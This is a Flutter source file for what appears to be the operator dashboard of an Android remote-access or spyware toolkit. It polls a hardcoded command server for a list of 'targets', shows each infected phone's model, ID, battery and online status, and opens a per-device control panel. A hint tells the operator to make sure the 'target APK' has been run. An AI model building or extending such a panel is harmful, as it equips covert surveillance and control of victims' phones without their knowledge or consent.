import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'control_panel.dart';

// ==================== GANTI DOMAIN DI SINI ====================
const String SERVER_URL = "http://nodepapi.queen-official.com:2565";

class DeviceDashboardPage extends StatefulWidget {
  const DeviceDashboardPage({super.key});

  @override
  State<DeviceDashboardPage> createState() => _DeviceDashboardPageState();
}

class _DeviceDashboardPageState extends State<DeviceDashboardPage> {
  List<dynamic> _devices = [];
  bool _isLoading = true;
  Timer? _timer;

  @override
  void initState() {
    super.initState();
    _fetchDevices();
    _timer = Timer.periodic(const Duration(seconds: 5), (timer) => _fetchDevices());
  }

  @override
  void dispose() {
    _timer?.cancel();
    super.dispose();
  }

  Future<void> _fetchDevices() async {
    try {
      final response = await http.get(
        Uri.parse("$SERVER_URL/api/list-targets"),
      ).timeout(const Duration(seconds: 5));

      if (response.statusCode == 200 && mounted) {
        setState(() {
          _devices = jsonDecode(response.body);
          _isLoading = false;
        });
        print("✅ Devices: ${_devices.length} targets");
      }
    } catch (e) {
      print("❌ Error: $e");
      if (mounted) {
        setState(() => _isLoading = false);
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    int activeCount = _devices.where((d) => d['status'] == "Online").length;

    return Scaffold(
      backgroundColor: const Color(0xFF050505),
      appBar: AppBar(
        backgroundColor: const Color(0xFF050505),
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back, color: Color(0xFFD500F9)),
          onPressed: () => Navigator.pop(context),
        ),
        title: const Text(
          "TARGET DEVICE",
          style: TextStyle(
            color: Color(0xFFFF4081),
            fontSize: 16,
            fontWeight: FontWeight.bold,
            letterSpacing: 2,
          ),
        ),
        centerTitle: true,
      ),
      body: SafeArea(
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            // Header Stats Card
            Container(
              margin: const EdgeInsets.all(16),
              padding: const EdgeInsets.all(20),
              decoration: BoxDecoration(
                color: const Color(0xFF141414),
                borderRadius: BorderRadius.circular(24),
                border: Border.all(color: const Color(0xFFD500F9).withOpacity(0.3), width: 1),
              ),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      const Text(
                        "ACTIVE TARGETS",
                        style: TextStyle(
                          color: Color(0xFFFF4081),
                          fontSize: 10,
                          letterSpacing: 2,
                          fontWeight: FontWeight.w600,
                        ),
                      ),
                      const SizedBox(height: 8),
                      Text(
                        "$activeCount",
                        style: const TextStyle(
                          color: Color(0xFFD500F9),
                          fontSize: 32,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                    ],
                  ),
                  GestureDetector(
                    onTap: _fetchDevices,
                    child: Container(
                      padding: const EdgeInsets.all(12),
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        border: Border.all(color: const Color(0xFFD500F9).withOpacity(0.5), width: 2),
                      ),
                      child: const Icon(
                        Icons.refresh,
                        color: Color(0xFFFF4081),
                        size: 28,
                      ),
                    ),
                  ),
                  Column(
                    crossAxisAlignment: CrossAxisAlignment.end,
                    children: [
                      const Text(
                        "TOTAL UNITS",
                        style: TextStyle(
                          color: Color(0xFFFF4081),
                          fontSize: 10,
                          letterSpacing: 2,
                          fontWeight: FontWeight.w600,
                        ),
                      ),
                      const SizedBox(height: 8),
                      Text(
                        "${_devices.length}",
                        style: const TextStyle(
                          color: Color(0xFFD500F9),
                          fontSize: 32,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                    ],
                  ),
                ],
              ),
            ),
            
            // Section Title
            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 20),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  Container(
                    padding: const EdgeInsets.only(left: 10),
                    decoration: const BoxDecoration(
                      border: Border(left: BorderSide(color: Color(0xFFFF4081), width: 4)),
                    ),
                    child: const Text(
                      "CONNECTED DEVICES",
                      style: TextStyle(
                        color: Color(0xFFFFFFFF),
                        fontSize: 14,
                        fontWeight: FontWeight.bold,
                        letterSpacing: 1.5,
                      ),
                    ),
                  ),
                  Text(
                    "Auto refresh 5s",
                    style: TextStyle(color: Colors.white38, fontSize: 8),
                  ),
                ],
              ),
            ),
            
            const SizedBox(height: 15),

            // Grid Data
            Expanded(
              child: _isLoading 
                ? const Center(
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        CircularProgressIndicator(
                          valueColor: AlwaysStoppedAnimation<Color>(Color(0xFFD500F9)),
                        ),
                        SizedBox(height: 12),
                        Text(
                          "SCANNING VOID...",
                          style: TextStyle(color: Color(0xFFD500F9), fontSize: 10, letterSpacing: 2),
                        ),
                      ],
                    ),
                  )
                : _devices.isEmpty 
                  ? const Center(
                      child: Column(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Icon(Icons.devices, color: Color(0xFFFF4081), size: 48),
                          SizedBox(height: 12),
                          Text(
                            "NO TARGETS IN VOID",
                            style: TextStyle(
                              color: Color(0xFFFF4081),
                              fontWeight: FontWeight.bold,
                              letterSpacing: 2,
                              fontSize: 11,
                            ),
                          ),
                          SizedBox(height: 8),
                          Text(
                            "Pastikan APK target sudah dijalankan",
                            style: TextStyle(color: Color(0xFFB0BEC5), fontSize: 10),
                          ),
                        ],
                      ),
                    )
                  : GridView.builder(
                      padding: const EdgeInsets.symmetric(horizontal: 15, vertical: 10),
                      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                        crossAxisCount: 2,
                        crossAxisSpacing: 12,
                        mainAxisSpacing: 12,
                        childAspectRatio: 0.85,
                      ),
                      itemCount: _devices.length,
                      itemBuilder: (context, index) {
                        final device = _devices[index];
                        bool isActive = device['status'] == "Online";
                        return _buildNeonCard(device, isActive);
                      },
                    ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildNeonCard(Map<String, dynamic> device, bool isActive) {
    return GestureDetector(
      onTap: () {
        Navigator.push(
          context,
          MaterialPageRoute(
            builder: (context) => ControlPanelPage(device: device),
          ),
        );
      },
      child: Container(
        padding: const EdgeInsets.all(12),
        decoration: BoxDecoration(
          color: const Color(0xFF141414),
          borderRadius: BorderRadius.circular(20),
          border: Border.all(
            color: isActive 
              ? const Color(0xFFD500F9).withOpacity(0.5) 
              : const Color(0xFFFF4081).withOpacity(0.2),
            width: 1.5,
          ),
          boxShadow: isActive ? [
            BoxShadow(
              color: const Color(0xFFD500F9).withOpacity(0.1),
              blurRadius: 10,
              spreadRadius: 2,
            ),
          ] : null,
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            // Header Row: Icon + Status
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                Container(
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    color: (isActive ? const Color(0xFFD500F9) : const Color(0xFFFF4081)).withOpacity(0.1),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: (isActive ? const Color(0xFFD500F9) : const Color(0xFFFF4081)).withOpacity(0.3)),
                  ),
                  child: Icon(
                    Icons.phone_android,
                    color: isActive ? const Color(0xFFD500F9) : const Color(0xFFFF4081),
                    size: 20,
                  ),
                ),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                  decoration: BoxDecoration(
                    color: (isActive ? const Color(0xFFD500F9) : const Color(0xFFFF4081)).withOpacity(0.15),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: (isActive ? const Color(0xFFD500F9) : const Color(0xFFFF4081)).withOpacity(0.4)),
                  ),
                  child: Row(
                    children: [
                      Container(
                        width: 6,
                        height: 6,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          color: isActive ? const Color(0xFFD500F9) : Colors.redAccent,
                        ),
                      ),
                      const SizedBox(width: 4),
                      Text(
                        isActive ? "ONLINE" : "OFFLINE",
                        style: TextStyle(
                          color: isActive ? const Color(0xFFD500F9) : const Color(0xFFFF4081),
                          fontSize: 8,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
            
            const Spacer(),
            
            // Device Model
            Text(
              device['model'] ?? "UNKNOWN DEVICE",
              style: const TextStyle(
                color: Color(0xFFFFFFFF),
                fontSize: 12,
                fontWeight: FontWeight.bold,
                letterSpacing: 0.5,
              ),
              maxLines: 1,
              overflow: TextOverflow.ellipsis,
            ),
            const SizedBox(height: 4),
            Text(
              device['id']?.toString() ?? "NO-ID",
              style: const TextStyle(
                color: Color(0xFFB0BEC5),
                fontSize: 8,
                fontFamily: 'monospace',
              ),
              maxLines: 1,
              overflow: TextOverflow.ellipsis,
            ),
            
            const Spacer(),
            
            // Battery & Last Seen
            Row(
              children: [
                Icon(
                  (device['charging'] == true) ? Icons.battery_charging_full : Icons.battery_full,
                  color: const Color(0xFFFF4081),
                  size: 12,
                ),
                const SizedBox(width: 4),
                Text(
                  "${device['battery'] ?? '0'}%",
                  style: const TextStyle(
                    color: Color(0xFFFFFFFF),
                    fontSize: 10,
                    fontWeight: FontWeight.bold,
                  ),
                ),
                const Spacer(),
                const Icon(Icons.access_time, color: Color(0xFFB0BEC5), size: 10),
                const SizedBox(width: 2),
                Text(
                  _formatDate(device['lastSeen']),
                  style: const TextStyle(color: Color(0xFFB0BEC5), fontSize: 7),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  String _formatDate(String? dateStr) {
    if (dateStr == null) return 'Unknown';
    try {
      if (dateStr.length >= 10) {
        return dateStr.substring(0, 10);
      }
      return dateStr;
    } catch (e) {
      return 'Unknown';
    }
  }
}